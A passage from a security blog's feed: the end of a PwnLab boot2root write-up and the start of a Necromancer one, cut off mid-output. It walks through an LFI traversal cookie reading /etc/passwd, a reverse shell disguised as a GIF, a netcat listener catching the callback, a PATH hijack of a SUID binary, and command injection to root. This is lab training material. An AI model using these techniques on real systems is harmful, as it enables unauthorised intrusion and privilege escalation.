</span><span class='line'>+------+------------------+
</span><span class='line'>| user | pass             |
</span><span class='line'>+------+------------------+
</span><span class='line'>| kent | Sld6WHVCSkpOeQ== |
</span><span class='line'>| mike | U0lmZHNURW42SQ== |
</span><span class='line'>| kane | aVN2NVltMkdSbw== |
</span><span class='line'>+------+------------------+
</span><span class='line'>3 rows in set (0.05 sec)</span></code></pre></td></tr></table></div></figure>


<p>3 users with base64 encoded passwords!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kent / JWzXuBJJNy
</span><span class='line'>mike / SIfdsTEn6I
</span><span class='line'>kane / iSv5Ym2GRo</span></code></pre></td></tr></table></div></figure>


<p>I logged in as kent and tried uploading a PHP reverse shell, but got an error stating that the file type is not allowed. Using the previous LFI method, let&rsquo;s take a look at the source code of the upload page:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'>
</span><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="nb">session_start</span><span class="p">();</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]))</span> <span class="p">{</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;You must be log in.&#39;</span><span class="p">);</span> <span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">&lt;html&gt;</span>
</span><span class='line'><span class="x">  &lt;body&gt;</span>
</span><span class='line'><span class="x">      &lt;form action=&#39;&#39; method=&#39;post&#39; enctype=&#39;multipart/form-data&#39;&gt;</span>
</span><span class='line'><span class="x">          &lt;input type=&#39;file&#39; name=&#39;file&#39; id=&#39;file&#39; /&gt;</span>
</span><span class='line'><span class="x">          &lt;input type=&#39;submit&#39; name=&#39;submit&#39; value=&#39;Upload&#39;/&gt;</span>
</span><span class='line'><span class="x">      &lt;/form&gt;</span>
</span><span class='line'><span class="x">  &lt;/body&gt;</span>
</span><span class='line'><span class="x">&lt;/html&gt;</span>
</span><span class='line'><span class="cp">&lt;?php</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;error&#39;</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="nv">$filename</span>  <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
</span><span class='line'>      <span class="nv">$filetype</span>  <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">];</span>
</span><span class='line'>      <span class="nv">$uploaddir</span> <span class="o">=</span> <span class="s1">&#39;upload/&#39;</span><span class="p">;</span>
</span><span class='line'>      <span class="nv">$file_ext</span>  <span class="o">=</span> <span class="nb">strrchr</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">);</span>
</span><span class='line'>      <span class="nv">$imageinfo</span> <span class="o">=</span> <span class="nb">getimagesize</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]);</span>
</span><span class='line'>      <span class="nv">$whitelist</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;.jpg&quot;</span><span class="p">,</span><span class="s2">&quot;.jpeg&quot;</span><span class="p">,</span><span class="s2">&quot;.gif&quot;</span><span class="p">,</span><span class="s2">&quot;.png&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">,</span> <span class="nv">$whitelist</span><span class="p">)))</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Not allowed extension, please upload images only.&#39;</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$filetype</span><span class="p">,</span><span class="s1">&#39;image&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Error 001&#39;</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="nv">$imageinfo</span><span class="p">[</span><span class="s1">&#39;mime&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;image/gif&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$imageinfo</span><span class="p">[</span><span class="s1">&#39;mime&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;image/jpeg&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$imageinfo</span><span class="p">[</span><span class="s1">&#39;mime&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;image/jpg&#39;</span><span class="o">&amp;&amp;</span> <span class="nv">$imageinfo</span><span class="p">[</span><span class="s1">&#39;mime&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;image/png&#39;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Error 002&#39;</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="nx">substr_count</span><span class="p">(</span><span class="nv">$filetype</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">){</span>
</span><span class='line'>          <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Error 003&#39;</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>      <span class="nv">$uploadfile</span> <span class="o">=</span> <span class="nv">$uploaddir</span> <span class="o">.</span> <span class="nb">md5</span><span class="p">(</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]))</span><span class="o">.</span><span class="nv">$file_ext</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">echo</span> <span class="s2">&quot;&lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$uploadfile</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;br /&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Error 4&#39;</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>We can see that the file will get uploaded to the /upload folder with an MD5 name and that it has to be an image file of the 4 allowed types, complete with a matching MIME type. To test it, I changed pentestmonkey&rsquo;s reverse shell extension to .gif and added the magic string at the beginning of the file (GIF98). Then I pushed the upload button and bingo! The shell has been successfully deployed at <code>upload/ff280c52a4fbcbea847ca4a2d69ce6c0.gif</code></p>

<p>My listener is prepared and all, but there is still the matter of how to execute the shell. For any possible hint, I&rsquo;ve looked t the source code of the index page:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'>
</span><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="c1">//Multilingual. Not implemented yet.</span>
</span><span class='line'><span class="c1">//setcookie(&quot;lang&quot;,&quot;en.lang.php&quot;);</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;lang&#39;</span><span class="p">]))</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="k">include</span><span class="p">(</span><span class="s2">&quot;lang/&quot;</span><span class="o">.</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;lang&#39;</span><span class="p">]);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="c1">// Not implemented yet.</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">&lt;html&gt;</span>
</span><span class='line'><span class="x">&lt;head&gt;</span>
</span><span class='line'><span class="x">&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;</span>
</span><span class='line'><span class="x">&lt;/head&gt;</span>
</span><span class='line'><span class="x">&lt;body&gt;</span>
</span><span class='line'><span class="x">&lt;center&gt;</span>
</span><span class='line'><span class="x">&lt;img src=&quot;images/pwnlab.png&quot;&gt;&lt;br /&gt;</span>
</span><span class='line'><span class="x">[ &lt;a href=&quot;/&quot;&gt;Home&lt;/a&gt; ] [ &lt;a href=&quot;?page=login&quot;&gt;Login&lt;/a&gt; ] [ &lt;a href=&quot;?page=upload&quot;&gt;Upload&lt;/a&gt; ]</span>
</span><span class='line'><span class="x">&lt;hr/&gt;&lt;br/&gt;</span>
</span><span class='line'><span class="cp">&lt;?php</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]))</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>      <span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;.php&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>      <span class="k">echo</span> <span class="s2">&quot;Use this server to upload and share image files inside the intranet&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">&lt;/center&gt;</span>
</span><span class='line'><span class="x">&lt;/body&gt;</span>
</span><span class='line'><span class="x">&lt;/html&gt; </span>
</span></code></pre></td></tr></table></div></figure>


<p>That cookie parameter looks vulnerable if we can include a file of our choosing. I tested it by replaying a request in Burp and using the following LFI for the cookie value:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Cookie: lang=../../../../etc/passwd</span></code></pre></td></tr></table></div></figure>


<p>The response came back with the contents of the passwd file, so it worked! I did the same, this time setting the cookie to the path of the previously uploaded shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Cookie: lang=../upload/ff280c52a4fbcbea847ca4a2d69ce6c0.gif</span></code></pre></td></tr></table></div></figure>


<p>And in our listener, we have a hit!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnlp 8888
</span><span class='line'>listening on [any] 8888 ...
</span><span class='line'>connect to [192.168.217.132] from (UNKNOWN) [192.168.217.143] 36356
</span><span class='line'>Linux pwnlab 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt20-1+deb8u4 (2016-02-29) i686 GNU/Linux
</span><span class='line'> 11:08:31 up  2:34,  0 users,  load average: 0.00, 0.01, 0.05
</span><span class='line'>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span><span class='line'>/bin/sh: 0: can't access tty; job control turned off
</span><span class='line'>$ python -c "import pty;pty.spawn('/bin/sh');"</span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;ve proceeded to switch through the 3 users for which I got the passwords earlier and see what can be done. Nothing interesting from kent, getting an authentication failure as mike, but in kane&rsquo;s home folder there&rsquo;s an interesting SUID binary called <em>msgmike</em></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-rwsr-sr-x 1 mike mike 5.1K Mar 17  2016 msgmike</span></code></pre></td></tr></table></div></figure>


<p>Trying to run it gives an error:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kane@pwnlab:~$ ./msgmike
</span><span class='line'>./msgmike
</span><span class='line'>cat: /home/mike/msg.txt: No such file or directory</span></code></pre></td></tr></table></div></figure>


<p>Interesting, this calls cat, but not from an absolute path. So if we create a malicious binary called cat and add kane&rsquo;s home to the PATH variable, we should be able to run an arbitrary program with mike&rsquo;s privileges.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kane@pwnlab:~$ echo "/bin/bash" &gt; cat
</span><span class='line'>echo "/bin/bash" &gt; cat
</span><span class='line'>kane@pwnlab:~$ chmod 777 cat
</span><span class='line'>chmod 777 cat</span></code></pre></td></tr></table></div></figure>


<p>Here we want to run bash as mike. Let&rsquo;s see how the PATH looks:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kane@pwnlab:~$ echo $PATH
</span><span class='line'>echo $PATH
</span><span class='line'>/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</span></code></pre></td></tr></table></div></figure>


<p>Now let&rsquo;s add the current location to the PATH:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>export PATH=.:$PATH
</span><span class='line'>kane@pwnlab:~$ echo $PATH
</span><span class='line'>echo $PATH
</span><span class='line'>.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:</span></code></pre></td></tr></table></div></figure>


<p>Running the binary turns us into mike!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kane@pwnlab:~$ ./msgmike
</span><span class='line'>./msgmike
</span><span class='line'>mike@pwnlab:~$</span></code></pre></td></tr></table></div></figure>


<p>In mike&rsquo;s home there is another SUID binary, this time owned by root. We can see where this is going..</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-rwsr-sr-x 1 root root 5.3K Mar 17  2016 msg2root
</span><span class='line'>mike@pwnlab:/home/mike$ ./msg2root
</span><span class='line'>./msg2root
</span><span class='line'>Message for root: pwn incoming
</span><span class='line'>pwn incoming
</span><span class='line'>pwn incoming</span></code></pre></td></tr></table></div></figure>


<p>This binary takes an input and outputs it to the screen, while also appending it to a file in root&rsquo;s home (below line is taken from strings output)</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/bin/echo %s &gt;&gt; /root/messages.txt</span></code></pre></td></tr></table></div></figure>


<p>We can chain commands by passing a string for the echo function and then adding a second command with <code>;</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./msg2root 
</span><span class='line'>./msg2root 
</span><span class='line'>Message for root: hey;/bin/sh
</span><span class='line'>hey;/bin/sh
</span><span class='line'>hey
</span><span class='line'># </span></code></pre></td></tr></table></div></figure>


<p>We&rsquo;re root now! Read the flag and game over:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># cat flag.txt
</span><span class='line'>cat flag.txt
</span><span class='line'>.-=~=-.                                                                 .-=~=-.
</span><span class='line'>(__  _)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(__  _)
</span><span class='line'>(_ ___)  _____                             _                            (_ ___)
</span><span class='line'>(__  _) /  __ \                           | |                           (__  _)
</span><span class='line'>( _ __) | /  \/ ___  _ __   __ _ _ __ __ _| |_ ___                      ( _ __)
</span><span class='line'>(__  _) | |    / _ \| '_ \ / _` | '__/ _` | __/ __|                     (__  _)
</span><span class='line'>(_ ___) | \__/\ (_) | | | | (_| | | | (_| | |_\__ \                     (_ ___)
</span><span class='line'>(__  _)  \____/\___/|_| |_|\__, |_|  \__,_|\__|___/                     (__  _)
</span><span class='line'>( _ __)                     __/ |                                       ( _ __)
</span><span class='line'>(__  _)                    |___/                                        (__  _)
</span><span class='line'>(__  _)                                                                 (__  _)
</span><span class='line'>(_ ___) If  you are  reading this,  means  that you have  break 'init'  (_ ___)
</span><span class='line'>( _ __) Pwnlab.  I hope  you enjoyed  and thanks  for  your time doing  ( _ __)
</span><span class='line'>(__  _) this challenge.                                                 (__  _)
</span><span class='line'>(_ ___)                                                                 (_ ___)
</span><span class='line'>( _ __) Please send me  your  feedback or your  writeup,  I will  love  ( _ __)
</span><span class='line'>(__  _) reading it                                                      (__  _)
</span><span class='line'>(__  _)                                                                 (__  _)
</span><span class='line'>(__  _)                                             For sniferl4bs.com  (__  _)
</span><span class='line'>( _ __)                                claor@PwnLab.net - @Chronicoder  ( _ __)
</span><span class='line'>(__  _)                                                                 (__  _)
</span><span class='line'>(_ ___)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(_ ___)
</span><span class='line'>`-._.-'               </span></code></pre></td></tr></table></div></figure>


<p>This was a nice challenge with the LFI twist! A new technique added to our repertoire, and another boot2root completed!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ____________________________________
</span><span class='line'>/ You're currently going through a   \
</span><span class='line'>| difficult transition period called |
</span><span class='line'>\ "Life."                            /
</span><span class='line'> ------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Destroy The Necromancer]]></title>
    <link href="http://chousensha.github.io/blog/2018/06/09/destroy-the-necromancer/"/>
    <updated>2018-06-09T06:02:55-04:00</updated>
    <id>http://chousensha.github.io/blog/2018/06/09/destroy-the-necromancer</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s challenge is a boot2root with 11 flags to collect.</p>

<!-- more -->


<p>The Nmap scan took really long and found nothing:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Nmap scan report for 192.168.217.142
</span><span class='line'>Host is up (0.00023s latency).
</span><span class='line'>All 65535 scanned ports on 192.168.217.142 are filtered
</span><span class='line'>MAC Address: 00:0C:29:3B:03:B5 (VMware)
</span><span class='line'>Too many fingerprints match this host to give specific OS details
</span><span class='line'>Network Distance: 1 hop
</span><span class='line'>
</span><span class='line'>TRACEROUTE
</span><span class='line'>HOP RTT     ADDRESS
</span><span class='line'>1   0.23 ms 192.168.217.142
</span><span class='line'>
</span><span class='line'>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 1336.70 seconds</span></code></pre></td></tr></table></div></figure>


<p>Then I tried an UDP scan, but only got 1 hit:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT    STATE SERVICE
</span><span class='line'>666/udp open  doom</span></code></pre></td></tr></table></div></figure>


<p>I tried connecting to it with netcat, but other than a message, I didn&rsquo;t find anything:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnu 192.168.217.142 666
</span><span class='line'>(UNKNOWN) [192.168.217.142] 666 (?) open
</span><span class='line'>
</span><span class='line'>You gasp for air! Time is running out!
</span><span class='line'>
</span><span class='line'>You gasp for air! Time is running out!</span></code></pre></td></tr></table></div></figure>


<h1>Flag #1 &ndash; Sniffing network traffic</h1>

<p>With nothing else to go with, I started sniffing the local traffic and looked if the Necromancer is sending anything across the network:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/necromancer/capture.PNG" title="capture" alt="Wireshark capture"></p>

<p>The machine is trying to establish TCP connections (SYN flag) to different IPs, on port 4444. So what happens if we listen on that port on our attacker machine?</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nc -vnlp 4444
</span><span class='line'>listening on [any] 4444 ...
</span><span class='line'>connect to [192.168.223.129] from (UNKNOWN) [192.168.223.128] 25759
</span><span class='line'>...V2VsY29tZSENCg0KWW91IGZpbmQgeW91cnNlbGYgc3RhcmluZyB0b3dhcmRzIHRoZSBob3Jpem9uLCB3aXRoIG5vdGhpbmcgYnV0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxhbmQgb2Ygbm90aGluZ25lc3MuDQoNClR1cm5pbmcgdG8geW91ciBub3J0aCB5b3Ugbm90aWNlIGEgc21hbGwgZmxpY2tlciBvZiBsaWdodCBpbiB0aGUgZGlzdGFuY2UuDQpZb3Ugd2FsayBub3J0aCB0b3dhcmRzIHRoZSBmbGlja2VyIG9mIGxpZ2h0LCBvbmx5IHRvIGJlIHN0b3BwZWQgYnkgc29tZSB0eXBlIG9mIGludmlzaWJsZSBiYXJyaWVyLiAgDQoNClRoZSBhaXIgYXJvdW5kIHlvdSBiZWdpbnMgdG8gZ2V0IHRoaWNrZXIsIGFuZCB5b3VyIGhlYXJ0IGJlZ2lucyB0byBiZWF0IGFnYWluc3QgeW91ciBjaGVzdC4gDQpZb3UgdHVybiB0byB5b3VyIGxlZnQuLiB0aGVuIHRvIHlvdXIgcmlnaHQhICBZb3UgYXJlIHRyYXBwZWQhDQoNCllvdSBmdW1ibGUgdGhyb3VnaCB5b3VyIHBvY2tldHMuLiBub3RoaW5nISAgDQpZb3UgbG9vayBkb3duIGFuZCBzZWUgeW91IGFyZSBzdGFuZGluZyBpbiBzYW5kLiAgDQpEcm9wcGluZyB0byB5b3VyIGtuZWVzIHlvdSBiZWdpbiB0byBkaWcgZnJhbnRpY2FsbHkuDQoNCkFzIHlvdSBkaWcgeW91IG5vdGljZSB0aGUgYmFycmllciBleHRlbmRzIHVuZGVyZ3JvdW5kISAgDQpGcmFudGljYWxseSB5b3Uga2VlcCBkaWdnaW5nIGFuZCBkaWdnaW5nIHVudGlsIHlvdXIgbmFpbHMgc3VkZGVubHkgY2F0Y2ggb24gYW4gb2JqZWN0Lg0KDQpZb3UgZGlnIGZ1cnRoZXIgYW5kIGRpc2NvdmVyIGEgc21hbGwgd29v